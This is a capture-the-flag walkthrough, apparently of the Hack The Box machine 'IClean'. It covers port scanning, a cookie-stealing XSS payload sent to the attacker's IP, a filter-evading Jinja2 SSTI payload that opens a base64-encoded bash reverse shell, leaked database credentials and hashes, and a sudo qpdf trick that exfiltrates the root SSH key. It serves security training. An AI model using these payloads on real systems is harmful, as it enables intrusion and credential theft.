## Port Scanning

```
┌─[tobaka@parrot]─[~/ctf/htb/machines/iclean]
└──╼ $cat nmap/iclean.nmap
# Nmap 7.94SVN scan initiated Thu Jun  6 20:38:08 2024 as: nmap -p- -T4 -oA nmap/iclean 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Thu Jun  6 20:38:29 2024 -- 1 IP address (1 host up) scanned in 21.31 seconds
```

```
┌─[tobaka@parrot]─[~/ctf/htb/machines/iclean]
└──╼ $cat nmap/iclean-detailed.nmap
# Nmap 7.94SVN scan initiated Thu Jun  6 20:39:58 2024 as: nmap -p 22,80 -sV -sC -vv -oA nmap/iclean-detailed 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up, received echo-reply ttl 63 (0.048s latency).
Scanned at 2024-06-06 20:39:58 CEST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  6 20:40:06 2024 -- 1 IP address (1 host up) scanned in 8.20 seconds
```

---

## Web Server

#### Enumerating Endpoints

```
┌─[tobaka@parrot]─[~/ctf/htb]
└──╼ $gobuster dir -u http://capiclean.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://capiclean.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2106]
/logout               (Status: 302) [Size: 189] [--> /]
/about                (Status: 200) [Size: 5267]
/services             (Status: 200) [Size: 8592]
/.                    (Status: 200) [Size: 16697]
/dashboard            (Status: 302) [Size: 189] [--> /]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
/server-status        (Status: 403) [Size: 278]
/choose               (Status: 200) [Size: 6084]
Progress: 38267 / 38268 (100.00%)
===============================================================
Finished
===============================================================
```

#### Exploiting XSS

```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://capiclean.htb/quote
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://capiclean.htb
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

service=<img+src%3dx+onerror%3d"fetch('http%3a//10.10.14.129%3a8000/'+%2b+document.cookie)%3b">&email=root%40tobaka.rocks
```

```
┌─[tobaka@parrot]─[~/ctf/htb]
└──╼ $nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.14.129] from (UNKNOWN) [10.10.11.12] 50934
GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZmN2Bw.zfosHdPl8Wy1DAApSap4rfEx0xQ HTTP/1.1
Host: 10.10.14.129:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

#### Exploiting SSTI

Now we point our attention to `/InvoiceGenerator`, `/QRGenerator` and `/EditServices`

`/EditServices` doesn't edit anything actually
`/InvoiceGenerator` generate an invoice... ONCE. You can generate new invoices if you want but it'll give you the same details when you use the invoice code at `/QRGenerator`
So both these endpoints are useless actually.
`/QRGenerator` can both generate a QR code or show you a receipt with the QR code embedded into it.

This request generate a QR code given an `invoice_id`

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://capiclean.htb/QRGenerator
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://capiclean.htb
DNT: 1
Connection: close
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZmQmJA.FIfdUUuAeazSa2-W_mUGf9JClFw
Upgrade-Insecure-Requests: 1

form_type=invoice_id&invoice_id=0113611809
```

Now, the thing is, if you try to fuzz the `invoice_id`, it'll give you back something useful only on `invoice_id`s
previously generated through `/InvoiceGenerator`. So it's useless.

Let's see the request to generate a receipt

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://capiclean.htb/QRGenerator
Content-Type: application/x-www-form-urlencoded
Content-Length: 353
Origin: http://capiclean.htb
DNT: 1
Connection: close
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZmQmJA.FIfdUUuAeazSa2-W_mUGf9JClFw
Upgrade-Insecure-Requests: 1

form_type=scannable_invoice&qr_link=http://capiclean.htb/static/qr_code/qr_code_0113611809.png
```

This one is tricky. If you put `http://capiclean.htb`, it'll send a request to that link, and embed the b64 of the response inside an img element; otherwise, it'll just reflect your input inside the said img element.

I've tried to get a file disclosure by looking for `/etc/passwd`, `app.py`, `config.py` (the backend is using Flask) but with no success.
I've also tried to change the proto to `file://` but no use.

Then I moved to SSTI.
But here's the catch: if you try to inject your payload in a `qr_link` that looks like this `http://capiclean.htb/static/qr_code/qr_code_011361180{{3*3}}.png` you won't get anything (actually you will get a b64 of the server's 404 response page, which is useless)
Otherwise, if you run an STTI without the `http://capiclean.htb`, the injection will succeed.
This happens because in the moment you include that link into the `qr_link` param, it won't reflect your input on the page, as we said before, but it'll send a request (because it is actually expecting the URL of a QR code, so it's trying to include the QR into the response)

Moving forward, I've tried different ways to access the `subclasses()` function to get an RCE, but everything failed. So I looked for some SSTI RCE bypasses and found this interesting blogpost https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
Which helped me to build a working payload and achieve RCE on the target.

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://capiclean.htb/QRGenerator
Content-Type: application/x-www-form-urlencoded
Content-Length: 353
Origin: http://capiclean.htb
DNT: 1
Connection: close
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZmQmJA.FIfdUUuAeazSa2-W_mUGf9JClFw
Upgrade-Insecure-Requests: 1

form_type=scannable_invoice&qr_link={{request.application|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo -n YmFzaCAtYyAnYmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvOTAwMSAgMD4mMSAn | base64 -d | bash')|attr('read')()}}
```

---

## User

```
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

```
admin:2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

---

## Privesc

```
consuela@iclean:/tmp/privesc$ sudo -l
Matching Defaults entries for consuela on iclean:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

```
consuela@iclean:/tmp/privesc$ /usr/bin/qpdf --help=usage
Read a PDF file, apply transformations or modifications, and write
a new PDF file.

Usage: qpdf [infile] [options] [outfile]
   OR  qpdf --help[={topic|--option}]

- infile, options, and outfile may be in any order as long as infile
  precedes outfile.
- Use --empty in place of an input file for a zero-page, empty input
- Use --replace-input in place of an output file to overwrite the
  input file with the output
- outfile may be - to write to stdout; reading from stdin is not supported
- @filename is an argument file; each line is treated as a separate
  command-line argument
- @- may be used to read arguments from stdin
- Later options may override earlier options if contradictory

Related options:
  --empty: use empty file as input
  --job-json-file: job JSON file
  --replace-input: overwrite input with output

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

```
consuela@iclean:/tmp/privesc$ sudo /usr/bin/qpdf --empty - @/root/root.txt

qpdf: unknown argument eb605783eb702b0fb5ff6392eccc9dea

For help:
  qpdf --help=usage       usage information
  qpdf --help=topic       help on a topic
  qpdf --help=--option    help on an option
  qpdf --help             general help and a topic list
```

```
consuela@iclean:/tmp/privesc$ sudo /usr/bin/qpdf --empty - @/root/.ssh/id_rsa

qpdf: unrecognized argument -----BEGIN OPENSSH PRIVATE KEY-----

For help:
  qpdf --help=usage       usage information
  qpdf --help=topic       help on a topic
  qpdf --help=--option    help on an option
  qpdf --help             general help and a topic list
```

```
consuela@iclean:/tmp/privesc$ sudo /usr/bin/qpdf --help=--filename
--filename=name

Specify the filename to be used for the attachment. This is what
is usually displayed to the user and is the name most graphical
PDF viewers will use when saving a file. It defaults to the last
element (basename) of the attached file's filename.
```

https://qpdf.readthedocs.io/en/stable/cli.html#embedded-files-attachments

```
consuela@iclean:/tmp/privesc$ sudo /usr/bin/qpdf --empty - --add-attachment /root/.ssh/id_rsa --
%PDF-1.3
%
1 0 obj
<< /Names << /EmbeddedFiles 2 0 R >> /PageMode /UseAttachments /Pages 3 0 R /Type /Catalog >>
endobj
2 0 obj
<< /Names [ (id_rsa) 4 0 R ] >>
endobj
3 0 obj
<< /Count 0 /Kids [ ] /Type /Pages >>
endobj
4 0 obj
<< /EF << /F 5 0 R /UF 5 0 R >> /F (id_rsa) /Type /Filespec /UF (id_rsa) >>
endobj
5 0 obj
<< /Params << /CheckSum <bb34da3f74ca5fb11f4ccbc393e113bc> /CreationDate (D:20240608140247Z) /ModDate (D:20240608140247Z) /Size 505 >> /Type /EmbeddedFile /Length 377 /Filter /FlateDecode >>
stream
xuQr@)˰ĄC3 8@DY\O*҇W^uNaቷFRs&4Y!6S!U`xHtoOm.6#Eic#y1\2

ҐwN!o}7G(MLbJ1?c9G%9h<@qm%Zު}+yq2[yl⣳
!"-t+i%ءFK@H@AD63wui{z.-?g[>J%w(=>
-endstream                        NH,-[L]ug&?KPAKxR
endobj
xref
0 6
0000000000 65535 f
0000000015 00000 n
0000000124 00000 n
0000000171 00000 n
0000000224 00000 n
0000000315 00000 n
trailer << /Root 1 0 R /Size 6 /ID [<069bfa6b170cfaa6128242af7c311229><069bfa6b170cfaa6128242af7c311229>] >>
startxref
915
%%EOF
```

```
sudo /usr/bin/qpdf --empty out.pdf --add-attachment /root/.ssh/id_rsa --
```

```
consuela@iclean:/tmp/privesc$ sudo /usr/bin/qpdf --show-attachment=id_rsa out.pdf
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```
┌─[tobaka@parrot]─[~/ctf/htb]
└──╼ $chmod 600 id_rsa && ssh root@10.10.11.12 -i id_rsa
The authenticity of host '10.10.11.12 (10.10.11.12)' can't be established.
ED25519 key fingerprint is SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.12' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 - Documentation:  https://help.ubuntu.com
 - Management:     https://landscape.canonical.com
 - Support:        https://ubuntu.com/pro

  System information as of Sat Jun  8 02:12:20 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@iclean:~#
```

---
